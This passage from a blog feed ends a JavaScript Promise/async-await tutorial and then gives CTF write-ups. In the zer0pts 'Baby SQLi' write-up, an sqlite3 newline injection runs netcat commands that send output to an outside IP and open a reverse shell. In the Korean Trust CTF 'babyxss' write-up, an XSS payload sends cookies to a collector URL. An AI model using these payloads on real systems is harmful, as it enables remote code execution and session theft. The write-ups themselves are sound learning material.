class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      resolve(res);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a().then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result); <span class="comment">// 100</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>And as above, it becomes fulfilled state and receive data using <code>then()</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  reject();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>And as above, When execute <code>reject()</code> method of callback it, It will be in rejected state :)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;htt://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      reject(<span class="keyword">new</span> error(res));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a().then.catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>As above, Can print error using the <code>reject()</code></p><blockquote><p>Promise Example</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        resolve(res);</span><br><span class="line">      &#125;</span><br><span class="line">      reject(<span class="keyword">new</span> error(<span class="string">&quot;Error&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a().then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/async/async-4.png?raw=true"></p><p>As above, You can see printed well by recevied the value.</p><p>Now let’s see how to disopose error in Promise!</p><p>Have a two dispose of error method. first method is using second argument in <code>then()</code>. second method is using <code>catch()</code>. But not recommend method the dispose of error use second argument in <code>then()</code> because, <code>then()</code> method is dont well catch a error.</p><blockquote><p>Dispose of error using second argument in <code>then()</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        resolve(res);</span><br><span class="line">      &#125;</span><br><span class="line">      reject(<span class="keyword">new</span> error(<span class="string">&quot;Error&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a().then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error in then()&quot;</span>);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;then error : &quot;</span>, err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/async/async-5.png?raw=true"></p><p>First, an error occurred in the then() method, but when I caught the error using the second argument of <code>then()</code> method, I can see that it was not caught well :( So, Not recommand the dispose of error use second argument in <code>then()</code> method.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        resolve(res);</span><br><span class="line">      &#125;</span><br><span class="line">      reject(<span class="keyword">new</span> error(<span class="string">&quot;Error&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a().then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/async/async-6.png?raw=true"></p><p>And I catch the error using the <code>catch()</code> method, you can see that it is caught well. :) Now, we will learn about async/await.</p><hr><p>async and await is one async processing pattern.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      resolve(res);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> a();</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>async and await, use as above. If you don’t use async and await, you can use a callback or then() method to handle the request. but it’s very annoying, so you have to use async/await. :)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;http://burp.kr/product.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">      resolve(res);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> a();</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">  &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>And when usine async/await as above, you can handle errors using try/catch statements</p><hr>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2021 Write Up</title>
      <link href="2021/03/08/2021-03-08-zer0pts-CTF-2021/"/>
      <url>2021/03/08/2021-03-08-zer0pts-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Baby-SQLi-170-pts"><a href="#Web-Baby-SQLi-170-pts" class="headerlink" title=" (Web) Baby SQLi [170 pts]"></a><span style="color:#21C587"></span> (Web) Baby SQLi [170 pts]</h2><blockquote><p>Baby SQLi challenge is bypass of waf and using shell command.</p></blockquote><p>First, You can using <code>.system/.shell/.sh</code> command and execute shell command in SQLite3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SQLite3 CLI</span><br><span class="line">sqlite&gt; .sh id|nc 141.164.52.207 2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Terminal</span><br><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>As above, you can see in sqlite3 executes a shell command using the <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlite3_query</span>(<span class="params">sql</span>):</span></span><br><span class="line">    p = subprocess.Popen([<span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;database.db&#x27;</span>],</span><br><span class="line">                         stdin=subprocess.PIPE,</span><br><span class="line">                         stdout=subprocess.PIPE,</span><br><span class="line">                         stderr=subprocess.PIPE)</span><br><span class="line">    o, e = p.communicate(sql.encode())</span><br><span class="line">    <span class="keyword">if</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(e)</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> o.decode().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> row == <span class="string">&#x27;&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">        result.append(<span class="built_in">tuple</span>(row.split(<span class="string">&#x27;|&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>Looking at the source code, you can line jump using the <code>\n</code> character because using the <code>communicate()</code> in <code>subporcess.Popen()</code> in <code>sqlite3_query()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;post&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>():</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&#x27;username&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&#x27;password&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &gt; <span class="number">32</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Too long username or password&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    password_hash = hashlib.sha256(password.encode()).hexdigest()</span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = sqlite3_query(</span><br><span class="line">            <span class="string">&#x27;SELECT * FROM users WHERE username=&quot;&#123;&#125;&quot; AND password=&quot;&#123;&#125;&quot;;&#x27;</span></span><br><span class="line">            .<span class="built_in">format</span>(sqlite3_escape(username), password_hash)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        flask.session[<span class="string">&#x27;name&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Invalid Credential&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br></pre></td></tr></table></figure><p>And looking at the source code in login logic, you can see that <code>username</code>/<code>password</code> value is input, the length is verified, and it is put in query statement and at this point, you can see that the <code>username</code> value is escaped. but, you don’t worry because treats escape characters as simple string is sqlite3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot; or 1&#x3D;1 -- &quot; and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>In other words, It doensn’t matter if it escaped as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot;;</span><br><span class="line">.sh id|nc 141.164.52.207 2;</span><br><span class="line">and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>So, you can use shell command by doing line jumps as above and using the .sh command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh id|nc 2376348879 2\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>If you write the exploit code as above, close <code>SELECT</code> statemnt and in the line immediately underneath execute <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh nc 2376348879 2 -e sh\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lvnp 2</span><br><span class="line">Listening on 0.0.0.0 2</span><br><span class="line">Connection received on 165.227.180.221 38761</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">cat templates&#x2F;index.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Welcome, &#123;&#123;name&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">        &#123;% if name &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">        &lt;p&gt;zer0pts&#123;w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;p&gt;No flag for you :(&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Final, I pass the shell using <code>e</code> option about <code>nc</code> and read <code>index.html</code> and saw the flag.</p><blockquote><p>FLAG : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trust CTF Write Up</title>
      <link href="2021/02/28/2021-02-27-Trust-CTF-2021/"/>
      <url>2021/02/28/2021-02-27-Trust-CTF-2021/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/home.png?raw=true"></p><p>오늘은 디미고의 Trust라는 팀에서 CTF를 주최해서 참여를 했었습니다. 개인적인 일도 있고 해서 아침부터 참여하지 못 하고, 오후에 조금 참여를 했습니다.</p><hr><h2 id="Web-babyxss-270-pts"><a href="#Web-babyxss-270-pts" class="headerlink" title=" (Web) babyxss [270 pts]"></a><span style="color:#21C587"></span> (Web) babyxss [270 pts]</h2><blockquote><p>babyxss 문제는 DOMPurify Bypass로 위장한 간단한 XSS 문제입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secrets.php&quot;</span>);</span><br><span class="line"><span class="comment"># This Challenge using newest version DomPurify..! Maybe unexploitable!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;content-security-policy: base-uri &#x27;self&#x27;; block-all-mixed-content; connect-src &#x27;self&#x27;;&quot;</span>);</span><br><span class="line">    header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1 id=&#x27;name&#x27;&gt;Hello &lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;integrity=&quot;sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27; src=&#x27;https://cure53.de/purify.js&#x27;&gt;&lt;/script&gt;&lt;script&gt;var name=&#x27;&quot;</span>. base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) .<span class="string">&quot;&#x27;;document.getElementById(&#x27;name&#x27;).innerHTML += DOMPurify.sanitize($(&#x27;&lt;p&gt;&#x27;).html(atob(name)).text())&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>문제로 들어오면 위와 같은 코드가 나오는데 보면 CSP도 걸려 있고, 밑에는 DOMPurify를 이용해서 XSS를 대응하고 있는 것을 볼 수 있습니다. 그래서 그냥 DOMPurify Bypass Payload를 아무 거나 삽입해서 트리거가 되길래 쿠키를 탈취해서 플래그를 얻었습니다.<br></p><p>하지만 트리거가 된 이유는 DOMPurify를 우회해서가 아닙니다. DOMPurify는 최신 버전을 사용하고 있기 때문에 우회하는 건 불가능했습니다. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;&lt;p&gt;&#x27;</span>).html(atob(name)).text()</span><br></pre></td></tr></table></figure><p>하지만 위 코드를 <code>sanitize()</code> 메서드의 인자로 넘겨주고 있는 것을 볼 수 있습니다. 바로 저기서 DOM 내부에 잠시 들어가게 되는데 저때 XSS가 트리거가 되는 것 입니다. 그래서 일반적인 페이로드를 이용해서도 XSS트리거를 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss.trustctf.xyz&#x2F;?name&#x3D;%3Csvg%3E%3C&#x2F;p%3E%3Cstyle%3E%3Ca%20id&#x3D;%22%3C&#x2F;style%3E%3Cimg%20src&#x3D;1%20onerror&#x3D;location.href&#x3D;%27https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;?f&#x3D;%27.concat(document.cookie)%3E%22%3E</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : TRUST{cf909172b91c8bf3f70c0e71f2809f36}</p></blockquote><hr><h2 id="Web-FLAG-Checker-1000-pts"><a href="#Web-FLAG-Checker-1000-pts" class="headerlink" title=" (Web) FLAG Checker [1000 pts]"></a><span style="color:#21C587"></span> (Web) FLAG Checker [1000 pts]</h2><blockquote><p>FLAG Checker 문제는 간단한 ReDos 문제입니다. 이론만 저번에 공부하고 처음 해보는데 그냥 신기한 기법인 거 같습니다. </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Wrong.... <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./secret.php&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = preg_match(<span class="string">&quot;/<span class="subst">&#123;$_GET[&#x27;flag&#x27;]&#125;</span>/&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>] &amp;&amp; <span class="variable">$result</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong....&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>문제로 들어오면 위와 같이 나오는데 얼마전에 이런 문제를 본적이 있어서 바로 ReDos가 생각이 났고, 해당 기법으로 슥삭 해주니 플래그가 나왔습니다. 해당 문제와 비슷한 문제가 나중에 webhacking.kr에도 올라온다고 해서 따로 익스 코드는 올리지 않겠습니다.</p><blockquote><p>FLAG : TRUST{2ef0c0b759425eed6d3932c109e0fe74}</p></blockquote><hr><h2 id="Web-nodejail-Not-Solve-400-pts"><a href="#Web-nodejail-Not-Solve-400-pts" class="headerlink" title=" (Web) nodejail (Not Solve) [400 pts]"></a><span style="color:#21C587"></span> (Web) nodejail (Not Solve) [400 pts]</h2><blockquote><p>nodejail 문제는 간단한 제일문제 입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/jail.png?raw=true"></p><p>문제로 들어오면 그냥 입력창 하나가 보입니다. Javasript 코드를 입력해주면 여러가지 문자가 필터링 걸린 